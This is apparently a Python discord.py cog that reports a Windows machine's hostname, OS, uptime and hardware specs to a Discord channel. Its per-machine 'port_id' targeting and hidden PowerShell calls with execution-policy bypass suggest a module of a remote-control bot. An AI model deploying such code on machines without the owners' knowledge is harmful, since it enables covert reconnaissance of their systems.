import os
import shutil
import ctypes
import locale
import platform
import subprocess
from datetime import timedelta
from discord.ext import commands

class SystemInfo(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(name="sysinfo", aliases=["spec", "info", "system"])
    async def show_sysinfo(self, ctx, target_id: str = None):
        
        if not getattr(self.bot, 'is_selected', False):
            return

        my_id = getattr(self.bot, 'port_id', 'Unknown')

        should_reply = False

        if target_id is None:
            should_reply = True
        elif target_id == my_id:
            should_reply = True
        
        if not should_reply:
            return
        
        async with ctx.typing():
            try:
                uname = platform.uname()
                os_info = f"{uname.system} {uname.release} ({uname.version})"
                node_name = uname.node

                try:
                    tick = ctypes.windll.kernel32.GetTickCount64()
                    uptime = str(timedelta(milliseconds=tick)).split('.')[0]
                except:
                    uptime = "Unknown"

                cpu_name = self.get_powershell("Get-CimInstance Win32_Processor | Select-Object -ExpandProperty Name")
                cpu_cores = os.cpu_count()
                
                total_ram_str = self.get_powershell("Get-CimInstance Win32_ComputerSystem | Select-Object -ExpandProperty TotalPhysicalMemory")
                free_ram_kb_str = self.get_powershell("Get-CimInstance Win32_OperatingSystem | Select-Object -ExpandProperty FreePhysicalMemory")          
                
                try:
                    total_ram_b = int(total_ram_str)
                    free_ram_b = int(free_ram_kb_str) * 1024 
                    used_ram_b = total_ram_b - free_ram_b
                    
                    ram_percent = round((used_ram_b / total_ram_b) * 100, 1)
                    
                    ram_info = f"Total: {self.format_bytes(total_ram_b)}\n" \
                               f"Used: {self.format_bytes(used_ram_b)} (`{ram_percent}%`)"
                except:
                    ram_info = "N/A"

                gpu_name = self.get_powershell("Get-CimInstance Win32_VideoController | Select-Object -ExpandProperty Name")
                try:
                    total, used, free = shutil.disk_usage("C:\\")
                    disk_percent = round((used / total) * 100, 1)
                    disk_info = f"[C:\\] {self.format_bytes(used)} / {self.format_bytes(total)} (`{disk_percent}%`) | {self.format_bytes(free)}"                
                except:
                    disk_info = "N/A"

               
                msg = (
                    f"System Specs - [{my_id}]\n"
                    "```bash\n"
                    f"OS: {os_info}\n"
                    f"Name: {node_name}\n"
                    f"Uptime: {uptime}\n\n"
                    "CPU:\n"
                    f"{cpu_name}\n"
                    f"({cpu_cores} Cores)\n\n"
                    f"GPU: {gpu_name}\n"
                    "RAM\n"
                    f"{ram_info}\n"
                    f"Disk (C:): {disk_info}\n"
                    "```\n"
                )

                
                await ctx.send(msg)

            except Exception as e:
                await ctx.send(f"**[{my_id}]** Error: {e}")

    def get_powershell(self, command):
        try:
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            
            ps_cmd = f'powershell -NoProfile -ExecutionPolicy Bypass -Command "{command}"'

            encoding = locale.getpreferredencoding() or 'utf-8'
            
            output = subprocess.check_output(
                ps_cmd, 
                startupinfo=startupinfo,
                shell=True, 
                stderr=subprocess.DEVNULL
            ).decode(encoding, errors='ignore').strip()
            
            lines = [line.strip() for line in output.split('\n') if line.strip()]
            
            if lines:
                return ", ".join(lines)
            return "Unknown"
            
        except Exception as e:
            print(f"PowerShell Error: {e}")
            return "Unknown"

    def format_bytes(self, size):
        power = 2**10 
        n = 0
        power_labels = {0 : '', 1: 'KB', 2: 'MB', 3: 'GB', 4: 'TB'}
        while size > power:
            size /= power
            n += 1
        return f"{size:.2f}{power_labels[n]}"

async def setup(bot: commands.Bot):
    await bot.add_cog(SystemInfo(bot))